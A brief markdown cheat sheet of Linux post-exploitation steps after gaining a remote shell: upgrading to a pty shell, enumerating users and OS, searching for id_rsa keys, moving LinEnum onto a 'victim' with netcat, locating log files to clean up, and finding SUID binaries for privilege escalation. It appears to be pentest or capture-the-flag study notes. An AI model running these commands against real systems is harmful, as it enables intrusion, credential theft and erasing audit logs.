# Techniques used by cyber hackers

This is some knowledge related to what attackers are doing once they have access to a remote shell. The first goal is to access root/administrator privileges, which is called **privilege escalation**. Then, a hacker will try to access private data (credential), and other services (database...).

<hr class="sl">

## List of steps

This is just random notes for now, feel free to improve it.

<details class="details-e mt-4">
<summary>Step 1: bash</summary>

* `echo $0`: see the language of the shell
* `bash`: use bash
* `python -c 'import pty; pty.spawn("/bin/bash")'`: use bash (if bash isn't available)
</details>

<details class="details-e">
<summary>Step 2: Find which user you are using</summary>

* `whoami`: username
* `id`: username, group...
</details>

<details class="details-e">
<summary>Step: Identify the machine</summary>

* `cat /etc/*release`: see OS info
* `uname -a`: see machine info
* Look for process that may be vulnerable
* Try to exploit backup scripts (ex: crontab)
* Try to find folders/files which exploitable permissions
</details>

<details class="details-e">
<summary>Step: Look for data</summary>

* `find / -name id_rsa 2> /dev/null`: rsa credentials
* Look for saves/backups
* Look for private files/passwords
</details>

<details class="details-e">
<summary>Step 😎: use LinEnum</summary>

[LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh) ([LineEnum GitHub](https://github.com/rebootuser/LinEnum/)) is a script doing most of the check mentioned above, and many more. You need to add it on the victim computer, 

* Try wget
* Try a text editor (ex: nano), and copy+paste
* Try FTP
* Try using nc/netcat (victim: `nc -l -p port > LinEnum.sh`, attacker: `nc IP 1337 < LinEnum.sh`)

Then simply do `chmod +x LinEnum.sh`, and `./LinEnum.sh`.
</details>

<details class="details-e">
<summary>Step cleanup</summary>

* `/var/log/auth.log`: ssh logs
* `/var/log/syslog`: firewall logs
* `/var/log/service`: "service" logs (ex: apache)
</details>

<hr class="sl">

## SUID exploits

SUID is a permission that make created by user, executed with the permissions of its creator. It means that a script created by root, will be having root privilege when being executed.

You should first find a vulnerable command,

```bash
$ find / -perm -u=s -type f 2>/dev/null
```

Then try to exploit it. The website [GTFOBins
](https://gtfobins.github.io/) is listing a lot of knowledge about what you can do with a lot of commands.